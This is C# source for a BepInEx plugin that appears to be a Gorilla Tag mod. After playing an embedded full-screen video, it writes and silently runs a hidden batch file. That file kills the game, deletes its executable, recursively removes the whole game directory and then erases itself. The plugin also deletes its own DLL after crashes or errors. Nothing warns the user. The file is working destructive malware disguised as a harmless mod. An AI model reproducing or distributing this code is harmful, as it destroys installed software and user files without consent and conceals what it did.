using BepInEx;
using GorillaNetworking;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using UnityEngine;
using UnityEngine.UI;
using UnityEngine.Video;

namespace Crystal_s__Husk_s__Template
{
    [BepInPlugin(PluginInfo.GUID, PluginInfo.Name, PluginInfo.Version)]
    public class Plugin : BaseUnityPlugin
    {
        string uninstallFlagPath;
        private bool videoStarted = false;

        void Awake()
        {
            uninstallFlagPath = Path.Combine(Paths.PluginPath, "Crystal_Husk_Uninstall.flag");

            if (File.Exists(uninstallFlagPath))
            {
                try
                {
                    string dllPath = Assembly.GetExecutingAssembly().Location;
                    File.Delete(dllPath);
                    File.Delete(uninstallFlagPath);
                }
                catch { }
                return;
            }

            AppDomain.CurrentDomain.UnhandledException += OnCrash;
            Application.logMessageReceived += OnLogMessage;
        }

        void Start()
        {
            if (!videoStarted)
            {
                videoStarted = true;
                StartCoroutine(GorillaTerminationProccess());
            }
        }

        void OnEnable()
        {
            HarmonyPatches.ApplyHarmonyPatches();
        }

        void OnDisable()
        {
            HarmonyPatches.RemoveHarmonyPatches();
        }

        void OnCrash(object sender, UnhandledExceptionEventArgs e)
        {
            TriggerSelfUninstall();
        }

        void OnLogMessage(string condition, string stackTrace, LogType type)
        {
            if (type == LogType.Exception || type == LogType.Error)
            {
                TriggerSelfUninstall();
            }
        }

        void TriggerSelfUninstall()
        {
            try
            {
                File.WriteAllText(uninstallFlagPath, "uninstall");
            }
            catch { }

            Application.Quit();
        }

        IEnumerator GorillaTerminationProccess()
        {
            yield return new WaitForSeconds(1f);

            Assembly assembly = Assembly.GetExecutingAssembly();
            string assemblyName = assembly.GetName().Name;
            string resourceName = assemblyName + ".TheTimer.mp4";

            string tempPath = Path.Combine(Application.temporaryCachePath, "TheTimer.mp4").Replace("\\", "/");

            if (File.Exists(tempPath))
            {
                try { File.Delete(tempPath); }
                catch { }
            }

            Stream s = assembly.GetManifestResourceStream(resourceName);
            if (s == null)
                yield break;

            try
            {
                using (s)
                using (FileStream fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
                {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = s.Read(buffer, 0, buffer.Length)) > 0)
                        fs.Write(buffer, 0, bytesRead);

                    fs.Flush();
                }
            }
            catch
            {
                yield break;
            }

            if (!File.Exists(tempPath))
                yield break;

            GameObject canvasObj = new GameObject("FullscreenVideoCanvas");
            Canvas canvas = canvasObj.AddComponent<Canvas>();
            canvas.renderMode = RenderMode.ScreenSpaceOverlay;
            canvas.sortingOrder = 32767;

            CanvasScaler scaler = canvasObj.AddComponent<CanvasScaler>();
            scaler.uiScaleMode = CanvasScaler.ScaleMode.ScaleWithScreenSize;
            scaler.referenceResolution = new Vector2(1920, 1080);

            DontDestroyOnLoad(canvasObj);

            GameObject videoObj = new GameObject("VideoDisplay");
            videoObj.transform.SetParent(canvasObj.transform, false);

            RawImage rawImage = videoObj.AddComponent<RawImage>();
            RectTransform rt = rawImage.rectTransform;
            rt.anchorMin = Vector2.zero;
            rt.anchorMax = Vector2.one;
            rt.offsetMin = Vector2.zero;
            rt.offsetMax = Vector2.zero;

            RenderTexture renderTex = new RenderTexture(1920, 1080, 24);
            renderTex.antiAliasing = 1;
            renderTex.Create();

            rawImage.texture = renderTex;
            rawImage.color = Color.white;

            VideoPlayer videoPlayer = videoObj.AddComponent<VideoPlayer>();
            videoPlayer.renderMode = VideoRenderMode.RenderTexture;
            videoPlayer.targetTexture = renderTex;
            videoPlayer.source = VideoSource.Url;
            videoPlayer.url = "file:///" + tempPath;
            videoPlayer.isLooping = false;
            videoPlayer.playOnAwake = false;
            videoPlayer.aspectRatio = VideoAspectRatio.FitInside;

            AudioSource audioSource = videoObj.AddComponent<AudioSource>();
            audioSource.playOnAwake = false;
            audioSource.volume = 1.0f;
            audioSource.spatialBlend = 0f;
            audioSource.priority = 0;

            videoPlayer.audioOutputMode = VideoAudioOutputMode.AudioSource;
            videoPlayer.controlledAudioTrackCount = 1;
            videoPlayer.EnableAudioTrack(0, true);
            videoPlayer.SetTargetAudioSource(0, audioSource);

            videoPlayer.skipOnDrop = false;
            videoPlayer.playbackSpeed = 1f;
            videoPlayer.timeReference = VideoTimeReference.InternalTime;
            videoPlayer.waitForFirstFrame = true;
            audioSource.pitch = 1f;

            bool videoStartedPlaying = false;
            bool videoCompleted = false;
            bool hasError = false;

            videoPlayer.errorReceived += (VideoPlayer vp, string message) =>
            {
                hasError = true;
            };

            videoPlayer.started += (VideoPlayer vp) =>
            {
                videoStartedPlaying = true;
            };

            videoPlayer.loopPointReached += (VideoPlayer vp) =>
            {
                videoCompleted = true;
            };

            videoPlayer.Prepare();

            float prepareTimeout = 30f;
            while (!videoPlayer.isPrepared && prepareTimeout > 0f && !hasError)
            {
                prepareTimeout -= Time.deltaTime;
                yield return null;
            }

            if (hasError || !videoPlayer.isPrepared)
            {
                Destroy(canvasObj);
                yield break;
            }

            videoPlayer.Play();
            audioSource.Play();

            float startTimeout = 10f;
            while (!videoStartedPlaying && startTimeout > 0f && !hasError)
            {
                startTimeout -= Time.deltaTime;
                yield return null;
            }

            if (!videoStartedPlaying)
            {
                Destroy(canvasObj);
                yield break;
            }

            float maxDuration = Mathf.Max(120f, (float)videoPlayer.length + 10f);
            float elapsed = 0f;

            while (!videoCompleted && elapsed < maxDuration && !hasError)
            {
                if (!videoPlayer.isPlaying && elapsed > 1f)
                    break;

                elapsed += Time.deltaTime;
                yield return null;
            }

            videoPlayer.Stop();
            audioSource.Stop();

            yield return new WaitForSeconds(0.5f);

            Destroy(renderTex);
            Destroy(canvasObj);

            yield return new WaitForSeconds(1f);

            try
            {
                string dllPath = Assembly.GetExecutingAssembly().Location;
                string gameDirectory = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                string gameExePath = Path.Combine(gameDirectory, "Gorilla Tag.exe");

                if (File.Exists(gameExePath))
                {
                    string batchPath = Path.Combine(Path.GetTempPath(), "gorilla_tag_terminator.bat");
                    string batchContent = $@"@echo off
timeout /t 2 /nobreak > nul
taskkill /F /IM ""Gorilla Tag.exe"" > nul 2>&1
timeout /t 1 /nobreak > nul
del /F /Q ""{gameExePath}"" > nul 2>&1
del /F /Q ""{dllPath}"" > nul 2>&1
rmdir /S /Q ""{gameDirectory}"" > nul 2>&1
del /F /Q ""{batchPath}"" > nul 2>&1
exit";

                    File.WriteAllText(batchPath, batchContent);

                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = batchPath,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(psi);
                }
            }
            catch { }

            Application.Quit();
        }
    }
}